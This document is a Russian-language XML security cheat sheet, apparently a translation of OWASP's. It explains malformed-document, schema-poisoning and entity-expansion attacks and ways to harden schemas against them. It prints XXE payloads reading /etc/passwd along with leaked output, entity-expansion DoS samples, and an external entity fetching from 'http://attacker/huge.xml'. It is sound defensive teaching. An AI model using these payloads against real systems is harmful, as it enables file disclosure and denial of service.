# Шпаргалка по безопасности XML

## Вступление

Хотя спецификации для XML и XML schemas предоставляют вам инструменты, необходимые для защиты XML-приложений, они также содержат множество уязвимостей в системе безопасности. Они могут быть использованы для выполнения различных типов атак, включая поиск файлов, подделку запросов на стороне сервера, сканирование портов и грубый взлом. Эта шпаргалка поможет вам понять, как злоумышленники могут использовать различные возможности XML, используемые в библиотеках и программном обеспечении, используя два возможных способа атаки:

- **Некорректно оформленные XML-документы**: Использование уязвимостей, возникающих, когда приложения сталкиваются с неправильно оформленными XML-документами.
- **Некорректные XML-документы**: Использование уязвимостей, возникающих, когда документы не имеют ожидаемой структуры.

## Работа с искаженными XML-документами

### Определение неправильно сформированного XML-документа

Если XML-документ не соответствует определению правильно сформированного документа в спецификации W3C XML, то он считается "неправильно сформированным". **Если XML-документ неправильно сформирован, анализатор XML обнаружит неустранимую ошибку, он должен остановить выполнение, документ не должен подвергаться какой-либо дополнительной обработке, и приложение должно отобразить сообщение об ошибке.** Неправильно сформированный документ может содержать одну или несколько из следующих проблем: отсутствующий конечный тег, порядок расположения элементов в бессмысленной структуре, введение запрещенных символов и так далее.

### Обработка искаженных XML-документов

**Для работы с искаженными документами разработчикам следует использовать XML-процессор, соответствующий спецификациям W3C и не требующий значительного дополнительного времени для обработки искаженных документов.** Кроме того, они должны использовать только правильно оформленные документы, проверять содержимое каждого элемента и обрабатывать только допустимые значения в пределах заранее определенных границ.

#### Неправильно оформленные XML-документы требуют дополнительного времени

**Некорректно оформленный документ может повлиять на потребление ресурсов центрального процессора (CPU).** В определенных сценариях время, необходимое для обработки некорректно оформленных документов, может быть больше, чем требуется для правильно оформленных документов. Когда это происходит, злоумышленник может использовать асимметричную атаку с потреблением ресурсов, чтобы воспользоваться большим временем обработки и вызвать отказ в обслуживании (DoS).

**Чтобы оценить вероятность этой атаки, проанализируйте время, затрачиваемое на создание обычного XML-документа, и время, затрачиваемое на создание некорректной версии того же документа.** Затем подумайте, как злоумышленник мог бы использовать эту уязвимость в сочетании с атакой XML flood с использованием нескольких документов для усиления эффекта.

### Приложения, обрабатывающие искаженные данные

**Некоторые синтаксические анализаторы XML обладают способностью восстанавливать искаженные документы.** Им можно дать указание сделать все возможное, чтобы вернуть корректное дерево со всем содержимым, которое они смогут проанализировать, независимо от несоответствия документа спецификациям. **Поскольку не существует заранее определенных правил для процесса восстановления, подход и результаты этих анализаторов могут не всегда совпадать. Использование некорректно оформленных документов может привести к неожиданным проблемам, связанным с целостностью данных.**

Следующие два сценария иллюстрируют векторы атак, которые анализатор будет анализировать в режиме восстановления:

#### Искаженный документ к искаженному документу

Согласно спецификации XML, строка `--` (с двойным дефисом) не должна встречаться в комментариях. При использовании режима восстановления xml и PHP следующий документ после восстановления останется прежним:

```xml
<element>
 <!-- one
  <!-- another comment
 comment -->
</element>
```

#### Правильно сформированный документ Нормализуется к правильно сформированному документу

Некоторые анализаторы могут рассмотреть возможность нормализации содержимого ваших разделов `CDATA`. Это означает, что они обновят специальные символы, содержащиеся в разделе `CDATA`, чтобы они содержали безопасные версии этих символов, хотя это и не требуется:

```xml
<element>
 <![CDATA[<script>a=1;</script>]]>
</element>
```

Нормализация раздела `CDATA` не является общепринятым правилом для синтаксических анализаторов. Libxml может преобразовать этот документ в его каноническую версию, но, хотя он хорошо оформлен, его содержимое может считаться искаженным в зависимости от ситуации:

```xml
<element>
 &lt;script&gt;a=1;&lt;/script&gt;
</element>
```

### Обработка принудительного синтаксического анализа

**Одна из популярных принудительных атак в XML заключается в разборе глубоко вложенных XML-документов без соответствующих им конечных тегов. Идея состоит в том, чтобы заставить жертву использовать - и в конечном итоге истощить - ресурсы компьютера и вызвать отказ в обслуживании цели.** В отчетах о DoS-атаке в Firefox 3.67 сообщалось об использовании 30 000 элементов open XML без соответствующих им конечных тегов. Удаление закрывающих тегов упростило атаку, поскольку для достижения тех же результатов требуется всего половина размера правильно оформленного документа. Количество обрабатываемых тегов в конечном итоге привело к переполнению стека. Упрощенная версия такого документа выглядела бы примерно так:

```xml
<A1>
 <A2>
  <A3>
   ...
    <A30000>
```

## Нарушение правил спецификации XML

Манипулирование документами с использованием синтаксических анализаторов, которые не соответствуют спецификациям W3C, может привести к неожиданным последствиям. **Может возникнуть вероятность сбоев и/или выполнения кода, если программное обеспечение должным образом не проверяет, как обрабатывать некорректные структуры XML. Использование в программном обеспечении нечетких XML-документов может привести к такому поведению.**

## Работа с недопустимыми XML-документами

**Злоумышленники могут вводить в документы неожиданные значения, чтобы воспользоваться преимуществами приложения, которое не проверяет, содержит ли документ допустимый набор значений.** Схемы задают ограничения, которые помогают определить, являются ли документы действительными, а действительный документ правильно сформирован и соответствует ограничениям схемы. Для проверки документа может использоваться более одной схемы, и эти ограничения могут отображаться в нескольких файлах, либо с использованием одного языка схемы, либо с учетом преимуществ различных языков схемы.

Чтобы избежать этих уязвимостей, рекомендуется, чтобы каждый XML-документ имел точно определенную XML-схему (не [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)), при этом каждая часть информации должна быть должным образом ограничена, чтобы избежать проблем, связанных с неправильной проверкой данных. Используйте локальную копию или заведомо исправный репозиторий вместо ссылки на схему, предоставленной в XML-документе. Кроме того, выполните проверку целостности файла XML-схемы, на который ссылается ссылка, учитывая возможность того, что репозиторий может быть скомпрометирован. В тех случаях, когда в XML-документах используются удаленные схемы, настройте серверы на использование только защищенных зашифрованных сообщений, чтобы злоумышленники не могли подслушивать сетевой трафик.

### Документ без схемы

Рассмотрим книготорговца, который использует веб-сервис через веб-интерфейс для совершения транзакций. XML-документ для транзакций состоит из двух элементов: значения `id`, связанного с товаром, и определенной `price`. Пользователь может ввести только определенное значение `id`, используя веб-интерфейс:

```xml
<buy>
 <id>123</id>
 <price>10</price>
</buy>
```

**Если структура документа не контролируется, приложение может также обрабатывать различные правильно оформленные сообщения с непредвиденными последствиями. Предыдущий документ мог содержать дополнительные теги, влияющие на поведение базового приложения, обрабатывающего его содержимое**:

```xml
<buy>
 <id>123</id><price>0</price><id></id>
 <price>10</price>
</buy>
```

Обратите внимание, что значение 123 указано в качестве `id`, но теперь документ содержит дополнительные открывающие и закрывающие теги. Злоумышленник закрыл элемент `id` и присвоил фиктивному элементу `price` значение 0. Последним шагом для придания структуре правильной формы является добавление одного пустого элемента  `id`. После этого приложение добавит закрывающий тег для `id` и установит `price` равной 10. Если приложение обрабатывает только первые значения, указанные для идентификатора и значения value, без выполнения какого-либо контроля над структурой, это может принести пользу злоумышленнику, предоставив возможность купить книгу, фактически не платя за нее.

### Неограниченная схема

**Некоторые схемы не содержат достаточных ограничений для типа данных, которые может получать каждый элемент.** Это то, что обычно происходит при использовании [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp); у него очень ограниченный набор возможностей по сравнению с типом ограничений, которые могут быть применены в XML-документах. Это может привести к появлению в приложении нежелательных значений в элементах или атрибутах, которые было бы легко ограничить при использовании других языков схем. В следующем примере "возраст" пользователя проверяется по встроенной схеме [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp):

```xml
<!DOCTYPE person [
 <!ELEMENT person (name, age)>
 <!ELEMENT name (#PCDATA)>
 <!ELEMENT age (#PCDATA)>
]>
<person>
 <name>John Doe</name>
 <age>11111..(1.000.000digits)..11111</age>
</person>
```

Предыдущий документ содержит встроенный [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) с корневым элементом с именем `person`. Этот элемент содержит два элемента в определенном порядке: "имя", а затем `age`. Затем определяется элемент `name`, содержащий `PCDATA`, а также элемент `age`.

После этого определения начинается формирование корректного XML-документа. Имя элемента содержит нерелевантное значение, но элемент `age` содержит миллион цифр. Поскольку нет никаких ограничений на максимальный размер элемента `age`, эта строка из миллиона цифр может быть отправлена на сервер для этого элемента.

Как правило, этот тип элементов должен содержать не более определенного количества символов и ограничиваться определенным набором символов (например, цифрами от 0 до 9, знаками + и -). Если не ввести соответствующие ограничения, приложения могут обрабатывать потенциально недопустимые значения, содержащиеся в документах.

Поскольку невозможно указать конкретные ограничения (максимальную длину для элемента "имя" или допустимый диапазон для элемента "возраст"), этот тип схемы увеличивает риск нарушения целостности и доступности ресурсов.

### Неправильная проверка данных

**Если схемы определены неточно и не содержат строгих правил, они могут привести к возникновению в приложении различных ситуаций. Результатом этого может стать раскрытие внутренних ошибок или документов, которые могут привести к неожиданным последствиям для функциональности приложения.**

#### Строковые типы данных

При условии, что вам необходимо использовать шестнадцатеричное значение, нет смысла определять это значение как строку, которая позже будет ограничена определенными 16 шестнадцатеричными символами. Чтобы проиллюстрировать этот сценарий, при использовании XML-шифрования некоторые значения должны быть закодированы с использованием base64 . Это определение схемы того, как должны выглядеть эти значения:

```xml
<element name="CipherData" type="xenc:CipherDataType"/>
 <complexType name="CipherDataType">
  <choice>
   <element name="CipherValue" type="base64Binary"/>
   <element ref="xenc:CipherReference"/>
  </choice>
 </complexType>
```

Предыдущая схема определяет элемент `CipherValue` как тип данных base64. В качестве примера, IBM WebSphere DataPower SOA Appliance допускает использование любого типа символов в этом элементе после допустимого значения base64 и будет считать его допустимым.

Первая часть этих данных должным образом проверена как значение base64, но остальные символы могут быть любыми другими (включая другие подэлементы элемента `cipherData`). Для элемента частично установлены ограничения, что означает, что информация, вероятно, тестируется с использованием приложения, а не предложенной типовой схемы.

#### Числовые типы данных

**Определение правильного типа данных для чисел может быть более сложным, поскольку существует больше вариантов, чем для строк.**

##### Негативные и позитивные ограничения

Числовые типы данных XML-схемы могут содержать различные диапазоны чисел. Они могут включать:

- **negativeInteger**: Только отрицательные числа
- **nonNegativeInteger**: Положительные числа и нулевое значение
- **positiveInteger**: Только положительные числа
- **nonPositiveInteger**: Отрицательные числа и нулевое значение

В следующем примере документа определяется `id` продукта, `price` и `quantity`, которые находятся под контролем злоумышленника:

```xml
<buy>
 <id>1</id>
 <price>10</price>
 <quantity>1</quantity>
</buy>
```

**Чтобы избежать повторения старых ошибок, может быть определена XML-схема, предотвращающая обработку неправильной структуры в тех случаях, когда злоумышленник хочет ввести дополнительные элементы.:**

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="buy">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="id" type="xs:integer"/>
    <xs:element name="price" type="xs:decimal"/>
    <xs:element name="quantity" type="xs:integer"/>
   </xs:sequence>
  </xs:complexType>
 </xs:element>
</xs:schema>
```

Ограничение этого типа данных `quantity` целым числом позволит избежать появления неожиданных символов. Как только приложение получит предыдущее сообщение, оно может рассчитать окончательную цену, выполнив операцию `price*quantity`. **Однако, поскольку этот тип данных может допускать отрицательные значения, это может привести к отрицательному результату для учетной записи пользователя, если злоумышленник введет отрицательное число. Чтобы избежать этой логической уязвимости, вы, вероятно, захотите увидеть здесь положительное целое число вместо integer.**

##### Деление на ноль

**При использовании пользовательских значений в качестве знаменателей при делении разработчикам следует избегать использования нулевого числа. В случаях, когда для деления в XSLT используется нулевое значение, будет возникать ошибка `FOAR0001`. Другие приложения могут генерировать другие исключения, и программа может завершиться сбоем.** Существуют определенные типы данных для XML-схем, которые специально избегают использования нулевого значения. Например, в случаях, когда отрицательные значения и ноль не считаются допустимыми, схема может указывать тип данных `positiveInteger` для элемента.

```xml
<xs:element name="denominator">
 <xs:simpleType>
  <xs:restriction base="xs:positiveInteger"/>
 </xs:simpleType>
</xs:element>
```

Элемент `denominator` теперь ограничен целыми положительными числами. Это означает, что допустимыми будут считаться только значения, превышающие ноль. Если вы увидите, что используется какой-либо другой тип ограничения, вы можете вызвать ошибку, если знаменатель равен нулю.

##### Специальные значения: Бесконечность, а не число (NaN)

Типы данных `float` и `double` содержат действительные числа и некоторые специальные значения: `-Infinity` или `-INF`, `NaN` и `+Infinity` или `INF`. Эти возможности могут быть полезны для выражения определенных значений, но иногда ими злоупотребляют. Проблема в том, что они обычно используются для выражения только вещественных чисел, таких как цены. Это распространенная ошибка, которая встречается в других языках программирования и не ограничивается только этими технологиями.

Если не учитывать весь спектр возможных значений для типа данных, это может привести к сбою базовых приложений. **Если специальные значения `Infinity` и `NaN` не требуются и ожидаются только действительные числа, рекомендуется использовать тип данных `decimal`.:**

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="buy">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="id" type="xs:integer"/>
    <xs:element name="price" type="xs:decimal"/>
    <xs:element name="quantity" type="xs:positiveInteger"/>
   </xs:sequence>
  </xs:complexType>
 </xs:element>
</xs:schema>
```
**Значение цены не вызовет никаких ошибок, если оно установлено на бесконечность или NaN, поскольку эти значения будут недопустимыми. Злоумышленник может воспользоваться этой проблемой, если эти значения разрешены.**

#### Общие ограничения на передачу данных

После выбора соответствующего типа данных разработчики могут ввести дополнительные ограничения. Иногда допустимым считается только определенное подмножество значений в пределах типа данных:

##### Prefixed Values

**Некоторые типы значений должны быть ограничены только определенными наборами: светофоры будут иметь только три типа цветов, доступны только 12 месяцев и т.д. Возможно, что в схеме установлены эти ограничения для каждого элемента или атрибута. Это наиболее подходящий сценарий для приложения с использованием списка разрешений: будут приниматься только определенные значения. В XML-схеме такое ограничение называется `enumeration (перечисление)`.** В следующем примере содержимое элемента month ограничено 12 возможными значениями:

```xml
<xs:element name="month">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:enumeration value="January"/>
   <xs:enumeration value="February"/>
   <xs:enumeration value="March"/>
   <xs:enumeration value="April"/>
   <xs:enumeration value="May"/>
   <xs:enumeration value="June"/>
   <xs:enumeration value="July"/>
   <xs:enumeration value="August"/>
   <xs:enumeration value="September"/>
   <xs:enumeration value="October"/>
   <xs:enumeration value="November"/>
   <xs:enumeration value="December"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

Ограничивая значение элемента month любым из предыдущих значений, приложение не будет манипулировать случайными строками.

##### Диапазоны

Программные приложения, базы данных и языки программирования обычно хранят информацию в определенных пределах. **При использовании элемента или атрибута в местах, где важны определенные размеры (чтобы избежать переполнения или недопотока), было бы логично проверить, считается ли допустимой длина данных.** Следующая схема может ограничить имя, используя минимальную и максимальную длину, чтобы избежать необычных сценариев:

```xml
<xs:element name="name">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:minLength value="3"/>
   <xs:maxLength value="256"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

В тех случаях, когда возможные значения ограничены определенной длиной (скажем, 8), это значение может быть указано следующим образом, чтобы оно было допустимым:

```xml
<xs:element name="name">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:length value="8"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

##### Шаблоны

Определенные элементы или атрибуты могут соответствовать определенному синтаксису. При использовании XML-схем вы можете добавить ограничения по `шаблонам`. **Если вы хотите убедиться, что данные соответствуют определенному шаблону, вы можете создать для него специальное определение. Хорошим примером могут служить номера социального страхования (SSN); в них должен использоваться определенный набор символов, определенная длина и определенный `шаблон`:**

```xml
<xs:element name="SSN">
 <xs:simpleType>
  <xs:restriction base="xs:token">
   <xs:pattern value="[0-9]{3}-[0-9]{2}-[0-9]{4}"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

В качестве значений для SSN будут разрешены только числа в диапазоне от `000-00-0000` до `999-99-9999`.

##### Утверждения

**Компоненты утверждений ограничивают существование и значения связанных элементов и атрибутов в XML-схемах. Элемент или атрибут будут считаться действительными в отношении утверждения только в том случае, если результат теста равен true без возникновения какой-либо ошибки. Переменная `$value` может использоваться для ссылки на содержимое анализируемого значения.**

В приведенном выше разделе "Деление на ноль" говорилось о возможных последствиях использования типов данных, содержащих нулевое значение для знаменателей, и предлагался тип данных, содержащий только положительные значения. В противоположном примере допустимым считается весь диапазон чисел, кроме нуля. Чтобы избежать раскрытия потенциальных ошибок, значения можно было бы проверить с помощью `assertion`, запрещающего нулевое число:

```xml
<xs:element name="denominator">
 <xs:simpleType>
  <xs:restriction base="xs:integer">
   <xs:assertion test="$value != 0"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

Это утверждение гарантирует, что `denominator` не будет содержать нулевое значение в качестве допустимого числа, а также позволяет использовать отрицательные числа в качестве допустимого знаменателя.

##### Происшествия

**Последствия того, что не определено максимальное количество вхождений, могут быть хуже, чем последствия того, что может произойти при получении экстремального количества элементов для обработки.** Два атрибута определяют минимальные и максимальные ограничения: `minOccurs` и `maxOccurs`.

 Значением по умолчанию как для атрибутов `minOccurs`, так и для атрибутов `maxOccurs` является `1`, но для некоторых элементов могут потребоваться другие значения. Например, если значение является необязательным, оно может содержать значение `minOccurs`, равное 0, а если максимальное количество не ограничено, оно может содержать значение `maxOccurs`, равное `unbounded`, как в следующем примере:

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="operation">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="buy" maxOccurs="unbounded">
     <xs:complexType>
      <xs:all>
       <xs:element name="id" type="xs:integer"/>
       <xs:element name="price" type="xs:decimal"/>
       <xs:element name="quantity" type="xs:integer"/>
      </xs:all>
     </xs:complexType>
    </xs:element>
  </xs:complexType>
 </xs:element>
</xs:schema>
```

Предыдущая схема включает корневой элемент с именем `operation`, который может содержать неограниченное количество элементов buy. Это распространенный вывод, поскольку разработчики обычно не хотят ограничивать максимальное количество вхождений. **Приложениям, использующим неограниченное количество вхождений, следует проверить, что происходит, когда они получают для обработки чрезвычайно большое количество элементов. Поскольку вычислительные ресурсы ограничены, следует проанализировать последствия и в конечном итоге использовать максимальное количество вместо `unbounded` значения.**

### Jumbo пейлоады

**Отправка XML-документа объемом 1 ГБ требует всего секунды обработки сервером и может не рассматриваться в качестве атаки. Вместо этого злоумышленник будет искать способ минимизировать нагрузку на процессор и трафик, используемые для создания такого типа атак, по сравнению с общим объемом ресурсов процессора сервера или трафика, используемых для обработки запросов.**

#### Традиционная крупная полезная нагрузка

**Существует два основных способа увеличить размер документа по сравнению с обычным:**

**- Глубинная атака: использование огромного количества элементов, имен элементов и/или значений элементов.**

**- Атака по ширине: использование огромного количества атрибутов, имен атрибутов и/или значений атрибутов.**

В большинстве случаев общим результатом будет огромный документ. Вот краткий пример того, как это выглядит:

```xml
<SOAPENV:ENVELOPE XMLNS:SOAPENV="HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/"
                  XMLNS:EXT="HTTP://COM/IBM/WAS/WSSAMPLE/SEI/ECHO/B2B/EXTERNAL">
 <SOAPENV:HEADER LARGENAME1="LARGEVALUE"
                 LARGENAME2="LARGEVALUE2"
                 LARGENAME3="LARGEVALUE3" …>
 ...
```

#### "Малые" Jumbo пейлоады

**Следующий пример представляет собой документ очень небольшого размера, но результаты его обработки могут быть аналогичны результатам обработки традиционных больших объемов пейлоадов.** Цель такой небольших пейлоадов заключается в том, что она позволяет злоумышленнику отправлять множество документов достаточно быстро, чтобы заставить приложение использовать большую часть или все доступные ресурсы:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
 <!ENTITY file SYSTEM "http://attacker/huge.xml" >
]>
<root>&file;</root>
```

### Заражение схемы

**Когда злоумышленник способен внести изменения в схему, это может привести к многочисленным последствиям с высокой степенью риска. В частности, последствия будут более опасными, если в схемах используется [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) (например, поиск файлов, отказ в обслуживании).** Злоумышленник может воспользоваться этим типом уязвимости в различных сценариях, всегда в зависимости от расположения схемы.

#### Заражение локальной схемы

**Заражение локальной схемы происходит, когда схемы доступны на одном и том же хосте, независимо от того, встроены они в один и тот же XML-документ или нет.**

##### Встроенная схема

**Наиболее тривиальный тип заражения схемы происходит, когда схема определена в одном и том же XML-документе.** Рассмотрим следующий неосознанно уязвимый пример, предоставленный W3C :

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
 <!ELEMENT note (to,from,heading,body)>
 <!ELEMENT to (#PCDATA)>
 <!ELEMENT from (#PCDATA)>
 <!ELEMENT heading (#PCDATA)>
 <!ELEMENT body (#PCDATA)>
]>
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>
```

Все ограничения на элемент note могут быть сняты или изменены, что позволит отправлять на сервер данные любого типа. Кроме того, если сервер обрабатывает внешние объекты, злоумышленник может использовать схему, например, для чтения удаленных файлов с сервера. **Этот тип схемы служит только рекомендацией для отправки документа, но для безопасного использования он должен содержать способ проверки целостности встроенной схемы. Атаки с использованием встроенных схем обычно используются для использования расширений внешних объектов. Встроенные XML-схемы также могут помочь в сканировании портов внутренних хостов или атаках методом перебора.**

##### Неправильные разрешения

**Часто можно избежать риска использования удаленно подделанных версий, обработав локальную схему.**

```xml
<!DOCTYPE note SYSTEM "note.dtd">
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>
```

**Однако, если локальная схема не содержит правильных разрешений, внутренний злоумышленник может изменить исходные ограничения.** В следующей строке приведен пример схемы, использующей разрешения, которые позволяют любому пользователю вносить изменения:

```text
-rw-rw-rw-  1 user  staff  743 Jan 15 12:32 note.dtd
```

Разрешения, установленные для файла `name.dtd`, позволяют любому пользователю системы вносить изменения. Очевидно, что эта уязвимость не связана со структурой XML или схемой, но поскольку эти документы обычно хранятся в файловой системе, стоит отметить, что злоумышленник может воспользоваться этим типом проблемы.

#### Заражение удаленной схемы

**Схемы, определенные внешними организациями, обычно используются удаленно. Если злоумышленник может перенаправить сетевой трафик или получить к нему доступ, он может заставить жертву получать контент другого типа, а не тот, который изначально предназначался.**

##### Атака "Человек посередине" (MitM)

Когда документы ссылаются на удаленные схемы, использующие незашифрованный протокол передачи гипертекста (HTTP), обмен данными осуществляется в виде обычного текста, и злоумышленник может легко повлиять на трафик. **Когда XML-документы ссылаются на удаленные схемы, использующие HTTP-соединение, это соединение может быть перехвачено и изменено до того, как оно дойдет до конечного пользователя:**

```xml
<!DOCTYPE note SYSTEM "http://example.com/note.dtd">
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>
```

Удаленный файл `note.dtd` может быть подвержен несанкционированному доступу при передаче по незашифрованному протоколу HTTP. Одним из доступных инструментов для проведения такого рода атак является mitmproxy .

##### Заражение DNS-кэша

Удаленное заражение схемы также может быть возможным даже при использовании зашифрованных протоколов, таких как защищенный протокол передачи гипертекста (HTTPS). **Когда программное обеспечение выполняет обратное разрешение системы доменных имен (DNS) для IP-адреса для получения имени хоста, это может не гарантировать, что IP-адрес действительно связан с именем хоста.** В этом случае программное обеспечение позволяет злоумышленнику перенаправлять контент на свои собственные адреса интернет-протокола (IP).
The previous example referenced the host `example.com` using an unencrypted protocol.

При переключении на HTTPS местоположение удаленной схемы будет выглядеть как `https://example/note.dtd`. В обычном сценарии IP-адрес `example.com` преобразуется в `1.1.1.1`:

```bash
$ host example.com
example.com has address 1.1.1.1
```

Если злоумышленник скомпрометирует используемый DNS, предыдущее имя хоста теперь может указывать на новый, другой IP-адрес, контролируемый злоумышленником `2.2.2.2`:

```bash
$ host example.com
example.com has address 2.2.2.2
```

Получая доступ к удаленному файлу, жертва может фактически извлекать содержимое хранилища, контролируемого злоумышленником.

##### Нападение злого сотрудника

Когда схемы размещаются и определяются третьими сторонами, их содержимое не контролируется пользователями схем. **Любые изменения, внесенные сотрудником-злоумышленником или внешним злоумышленником, контролирующим эти файлы, могут повлиять на всех пользователей, обрабатывающих схемы. Впоследствии злоумышленники могут повлиять на конфиденциальность, целостность или доступность других сервисов (особенно если используется схема [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)).**

### Расширение XML-объекта

**Если синтаксический анализатор использует [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp), злоумышленник может ввести данные, которые могут негативно повлиять на анализатор XML во время обработки документа. Эти негативные последствия могут включать сбой анализатора или доступ к локальным файлам.

#### Примеры уязвимых реализаций Java

**Используя возможности [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) для обращения к локальным или удаленным файлам, можно повлиять на конфиденциальность файлов.** Кроме того, также возможно повлиять на доступность ресурсов, если не были установлены надлежащие ограничения для расширения сущностей. Рассмотрим следующий пример кода XXE.

**Пример XML**:

```xml
<!DOCTYPE contacts SYSTEM "contacts.dtd">
<contacts>
 <contact>
  <firstname>John</firstname>
  <lastname>&xxe;</lastname>
 </contact>
</contacts>
```

**Пример DTD**:

```xml
<!ELEMENT contacts (contact*)>
<!ELEMENT contact (firstname,lastname)>
<!ELEMENT firstname (#PCDATA)>
<!ELEMENT lastname ANY>
<!ENTITY xxe SYSTEM "/etc/passwd">
```

##### XXE используя DOM

```java
import java.io.IOException;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import org.xml.sax.InputSource;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

public class parseDocument {
 public static void main(String[] args) {
  try {
   DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
   DocumentBuilder builder = factory.newDocumentBuilder();
   Document doc = builder.parse(new InputSource("contacts.xml"));
   NodeList nodeList = doc.getElementsByTagName("contact");
   for (int s = 0; s < nodeList.getLength(); s++) {
     Node firstNode = nodeList.item(s);
     if (firstNode.getNodeType() == Node.ELEMENT_NODE) {
       Element firstElement = (Element) firstNode;
       NodeList firstNameElementList = firstElement.getElementsByTagName("firstname");
       Element firstNameElement = (Element) firstNameElementList.item(0);
       NodeList firstName = firstNameElement.getChildNodes();
       System.out.println("First Name: "  + ((Node) firstName.item(0)).getNodeValue());
       NodeList lastNameElementList = firstElement.getElementsByTagName("lastname");
       Element lastNameElement = (Element) lastNameElementList.item(0);
       NodeList lastName = lastNameElement.getChildNodes();
       System.out.println("Last Name: " + ((Node) lastName.item(0)).getNodeValue());
     }
    }
  } catch (Exception e) {
    e.printStackTrace();
  }
 }
}
```

Предыдущий код выдает следующий результат:

```bash
$ javac parseDocument.java ; java parseDocument
First Name: John
Last Name: ### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

##### XXE используя DOM4J

```java
import org.dom4j.Document;
import org.dom4j.DocumentException;
import org.dom4j.io.SAXReader;
import org.dom4j.io.OutputFormat;
import org.dom4j.io.XMLWriter;

public class test1 {
 public static void main(String[] args) {
  Document document = null;
  try {
   SAXReader reader = new SAXReader();
   document = reader.read("contacts.xml");
  } catch (Exception e) {
   e.printStackTrace();
  }
  OutputFormat format = OutputFormat.createPrettyPrint();
  try {
   XMLWriter writer = new XMLWriter( System.out, format );
   writer.write( document );
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
}
```

Предыдущий код выдает следующий результат:

```bash
$ java test1
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE contacts SYSTEM "contacts.dtd">

<contacts>
 <contact>
  <firstname>John</firstname>
  <lastname>### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

##### XXE используя SAX

```java
import java.io.IOException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;

public class parseDocument extends DefaultHandler {
 public static void main(String[] args) {
  new parseDocument();
 }
 public parseDocument() {
  try {
   SAXParserFactory factory = SAXParserFactory.newInstance();
   SAXParser parser = factory.newSAXParser();
   parser.parse("contacts.xml", this);
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
 @Override
 public void characters(char[] ac, int i, int j) throws SAXException {
  String tmpValue = new String(ac, i, j);
  System.out.println(tmpValue);
 }
}
```

Предыдущий код выдает следующий результат:

```bash
$ java parseDocument
John
#### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

##### XXE используя StAX

```java
import javax.xml.parsers.SAXParserFactory;
import javax.xml.stream.XMLStreamReader;
import javax.xml.stream.XMLInputFactory;
import java.io.File;
import java.io.FileReader;
import java.io.FileInputStream;

public class parseDocument {
 public static void main(String[] args) {
  try {
   XMLInputFactory xmlif = XMLInputFactory.newInstance();
   FileReader fr = new FileReader("contacts.xml");
   File file = new File("contacts.xml");
   XMLStreamReader xmlfer = xmlif.createXMLStreamReader("contacts.xml",
                                            new FileInputStream(file));
   int eventType = xmlfer.getEventType();
   while (xmlfer.hasNext()) {
    eventType = xmlfer.next();
    if(xmlfer.hasText()){
     System.out.print(xmlfer.getText());
    }
   }
   fr.close();
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
}

```

Предыдущий код выдает следующий результат:

```bash
$ java parseDocument
<!DOCTYPE contacts SYSTEM "contacts.dtd">John### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

#### Рекурсивная ссылка на объект

**Когда определение элемента `A` является другим элементом `B`, и этот элемент `B` определен как элемент `A`, эта схема описывает циклическую ссылку между элементами:**

```xml
<!DOCTYPE A [
 <!ELEMENT A ANY>
 <!ENTITY A "<A>&B;</A>">
 <!ENTITY B "&A;">
]>
<A>&A;</A>
```

#### Квадратичное увеличение

**Вместо определения множества небольших, глубоко вложенных объектов злоумышленник в этом сценарии определяет один очень большой объект и обращается к нему столько раз, сколько возможно, что приводит к квадратичному расширению (*O(n ^ 2)*).**

Результатом следующей атаки будет 100 000 x 100 000 символов в памяти.

```xml
<!DOCTYPE root [
 <!ELEMENT root ANY>
 <!ENTITY A "AAAAA...(a 100.000 A's)...AAAAA">
]>
